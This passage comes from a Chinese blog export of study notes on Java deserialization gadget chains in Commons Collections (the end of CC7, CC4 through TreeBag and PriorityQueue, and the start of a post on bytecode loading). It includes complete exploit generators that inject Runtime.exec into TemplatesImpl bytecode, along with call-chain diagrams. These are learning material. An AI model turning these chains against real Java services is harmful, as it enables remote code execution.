class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">fack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazymap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map1,fack);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazymap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map2,fack);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        table.put(lazymap1,<span class="string">&quot;baicany&quot;</span>);<span class="comment">//也可以table.put(map1,&quot;baicany&quot;);</span></span><br><span class="line">        table.put(lazymap2,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        map2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(lazymap2,chain);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(table);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>哪里也可以改成这样反正没什么区别</p>
<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable.readOject-&gt;</span><br><span class="line">    Hashtable.reconstitutionPut-&gt;</span><br><span class="line">    	TiedMapEntry.hashcode-&gt;</span><br><span class="line">    		Lazy.map-&gt;</span><br><span class="line">    			ChainedTransformer.transformer-&gt;</span><br><span class="line">    				....</span><br></pre></td></tr></table></figure>

<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">H<span class="function"><span class="title">ashtable</span>.readOject-&gt;</span></span><br><span class="line">    H<span class="function"><span class="title">ashtable</span>.reconstitutionPut-&gt;</span></span><br><span class="line">    	 A<span class="function"><span class="title">bstractMap</span>.equals-&gt;</span></span><br><span class="line">    	 	 L<span class="function"><span class="title">azyMap</span>.get-&gt;</span></span><br><span class="line">    	 	  	<span class="function"><span class="title">transformer</span>()-&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个利用缩了中间利用部分，如果是ysoserial的话</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">H<span class="function"><span class="title">ashtable</span>.readOject-&gt;</span></span><br><span class="line">    H<span class="function"><span class="title">ashtable</span>.reconstitutionPut-&gt;</span></span><br><span class="line">    	L<span class="function"><span class="title">azyMap</span>.equals-&gt;</span></span><br><span class="line">    		A<span class="function"><span class="title">bstractMapDecorator</span>.equals-&gt;</span></span><br><span class="line">    			H<span class="function"><span class="title">ashMap</span>.equals-&gt;</span></span><br><span class="line">    				A<span class="function"><span class="title">bstractMap</span>.equals-&gt;</span></span><br><span class="line">    					L<span class="function"><span class="title">azyMap</span>.get-&gt;</span></span><br><span class="line">    						transformer()</span><br><span class="line">    						-&gt;....</span><br></pre></td></tr></table></figure>



<p>cc链到此就完啦,终于搞完啦，最后一条链子还当头一棒啊</p>
<p>依赖版本</p>
<blockquote>
<p>commons-collections : 3.1</p>
</blockquote>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链4</title>
    <url>/2023/07/17/cc4/</url>
    <content><![CDATA[<p>CC4 是 CC2 的一个变种，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer，再利用 InstantiateTransformer 实例化 TemplatesImpl</p>
<p>ysoserial 的 CC4 没什么意思，在这里补充一个对 PriorityQueue 的替代链 TreeBag。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TreeBag-TreeMap"><a href="#TreeBag-TreeMap" class="headerlink" title="TreeBag &amp; TreeMap"></a>TreeBag &amp; TreeMap</h3><p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
<p>除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。</p>
<p>对于 Bag 我很陌生，所以这里简单介绍一下。</p>
<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
<p>TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="title function_">TreeBag</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">TreeMap</span>(comparator));</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">protected</span> <span class="title function_">AbstractMapBag</span><span class="params">(Map&lt;E, MutableInteger&gt; map)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.map = map;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TreeMap</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> K&gt; comparator)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在对 TreeBag 反序列化时，会将反序列化出来的 Comparator 对象交给 TreeMap 实例化，并调用父类的 <code>doReadObject</code> 方法处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject();</span><br><span class="line">    Comparator&lt;? <span class="built_in">super</span> E&gt; comp = (Comparator)in.readObject();</span><br><span class="line">    <span class="built_in">super</span>.doReadObject(<span class="keyword">new</span> <span class="title class_">TreeMap</span>(comp), in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而doReadObject方法会向TreeMap中put数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadObject</span><span class="params">(Map&lt;E, MutableInteger&gt; map, ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="built_in">this</span>.map = map;</span><br><span class="line">    <span class="type">int</span> <span class="variable">entrySize</span> <span class="operator">=</span> in.readInt();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; entrySize; ++i) &#123;</span><br><span class="line">        <span class="type">E</span> <span class="variable">obj</span> <span class="operator">=</span> in.readObject();</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">        map.put(obj, <span class="keyword">new</span> <span class="title class_">MutableInteger</span>(count));</span><br><span class="line">        <span class="built_in">this</span>.size += count;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>类似优先级队列，对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而 TreeBag 则是依赖了 TreeMap 在 put 数据时会调用 compare 进行排序的特点来实现数据顺序的保存。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    Entry&lt;K,V&gt; t = root;</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123;</span><br><span class="line">        compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line"></span><br><span class="line">        root = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(key, value, <span class="literal">null</span>);</span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>毫无疑问，compare 方法中调用了 comparator 进行比较，那我们就可以使用 TransformingComparator 触发后续的逻辑。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final int compare(Object k1, Object k2) &#123;</span><br><span class="line">    return comparator==null ? ((Comparable&lt;? super K&gt;)k1).compareTo((K)k2)</span><br><span class="line">        : comparator.compare((K)k1, (K)k2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>所以也就用了一个新的类的就行了,注意好细节,这次要注意什么呢？,自己想想,直接手搓就行了</p>
<h1 id="TreeBag"><a href="#TreeBag" class="headerlink" title="TreeBag"></a>TreeBag</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lagou;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.time.temporal.Temporal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,code);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(constantTransformer);</span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">bag</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeBag</span>(comparator);</span><br><span class="line">        bag.add(TrAXFilter.class);</span><br><span class="line">        setFieldValue(comparator,<span class="string">&quot;transformer&quot;</span>,transformer);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc4.txt&quot;</span>));</span><br><span class="line">        outputStream.writeObject(bag);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc4.txt&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为什么要 setFieldValue(comparator,”transformer”,transformer);</p>
<p>因为在add上面也会调用一次put</p>
<p>道理,要是拼凑的话还有其他版本.</p>
<p>其实这里要是用c2链的话就够简洁了,emmm这种用于禁了InvokerTransformer情况吧,每个链子有每个链子存在的</p>
<h1 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lagou;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] code = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,code);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>();</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class,<span class="number">1</span>&#125;);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,comparator);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc4.txt&quot;</span>));</span><br><span class="line">        outputStream.writeObject(queue);</span><br><span class="line">        outputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc4.txt&quot;</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TreeBag.readObject()-&gt;</span><br><span class="line">    AbstractMapBag.doReadObject()-&gt;</span><br><span class="line">    	TreeMap.put()-&gt;</span><br><span class="line">    		TransformingComparator.compare()-&gt;</span><br><span class="line">    			InvokerTransformer.transformer()-&gt;</span><br><span class="line">    				InstantiateTransformer.transformer()-&gt;</span><br><span class="line">    				 	TrAXFilter.TrAXFilte()-&gt;</span><br><span class="line">                            TemptalesImpl.newTransformer()-&gt;</span><br><span class="line">    					...</span><br><span class="line">    				Runtime.getRuntime.exec()</span><br></pre></td></tr></table></figure>

<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    PriorityQueue.heapify<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    	PriorityQueue.siftDown<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    		PriorityQueue.siftDownUsingComparator<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    			TransformingComparator.compare<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    				InstantiateTransformer.transformer<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    				 	TrAXFilter.TrAXFilte<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    				 	TemptalesImpl.newTransformer<span class="function"><span class="params">()</span>-&gt;</span></span><br><span class="line">    					...</span><br><span class="line">    				Runtime.getRuntime.exec()</span><br></pre></td></tr></table></figure>



<p>commons-collections4 : 4.0</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>java动态加载字节码</title>
    <url>/2023/07/12/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="Java-动态加载字节码"><a href="#Java-动态加载字节码" class="headerlink" title="Java 动态加载字节码"></a>Java 动态加载字节码</h1><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>Java字节码指的是JVM执⾏使⽤的⼀类指令，通常被存储在 .class ⽂件中 </p>
<p>P神的定义：</p>
<p><img src="https://baicany.github.io/images/1241235.jpg" alt="在这里插入图片描述"></p>
<h3 id="利⽤URLClassLoader加载远程-本地class⽂件"><a href="#利⽤URLClassLoader加载远程-本地class⽂件" class="headerlink" title="利⽤URLClassLoader加载远程&#x2F;本地class⽂件"></a>利⽤URLClassLoader加载远程&#x2F;本地class⽂件</h3><p>在学习完类加载机制，URLClassLoader是AppClassLoader的⽗类 正常情况下(扩展类加载器)，Java会根据配置项sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URL类） 来寻找 .class ⽂件来加载，这个基础路径有分三种情况：  </p>
<ul>
<li><p>URL未以斜杠 &#x2F; 结尾，则认为是⼀个Jar⽂件，使⽤JarLoader来寻找类，即在Jar包上寻找类，不以就会认为该 URL 被假定为引用将根据需要打开的 JAR 文件。</p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名为file，则使⽤FileLoader来寻找类，即在本地系统中寻找 .class ⽂件 </p>
</li>
<li><p>URL以斜杠 &#x2F; 结尾，且协议名不为file，则使⽤最基础的Loader来寻找类</p>
</li>
</ul>
<h3 id="本地加载-class-⽂件"><a href="#本地加载-class-⽂件" class="headerlink" title="本地加载 .class ⽂件"></a>本地加载 .class ⽂件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader; </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urlclassloader</span> &#123; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123; </span><br><span class="line">    <span class="type">URLClassLoader</span> <span class="variable">urlclassloader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:///Users/nivia/Desktop/Java/src/&quot;</span>)&#125;); </span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> urlclassloader.loadClass(<span class="string">&quot;Test&quot;</span>); c.newInstance(); &#125; &#125; </span><br></pre></td></tr></table></figure>

